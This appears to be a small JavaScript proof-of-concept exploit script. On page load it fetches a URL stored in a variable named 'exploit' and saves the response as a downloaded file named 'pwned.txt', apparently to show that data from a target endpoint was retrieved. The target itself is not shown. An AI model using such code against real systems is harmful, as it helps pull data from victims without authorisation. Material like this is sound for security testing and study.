function download(filename, text) {
	var element = document.createElement('a');
	element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
	element.setAttribute('download', filename);

	element.style.display = 'none';
	document.body.appendChild(element);

	element.click();

	document.body.removeChild(element);
}


// Start file download.
window.onload = async function () {
	// Generate download of pwned.txt file with some content
	let text = await axios.get(exploit)
		.then((response) => {
			return response.data;
		})
		.catch((err) => {
			console.error(err);
		})
	if (/\ufffd/.test(text) === false) {
		var filename = "pwned.txt";
		download(filename, text);
	} else {
		console.log("connection ok!")
	}
};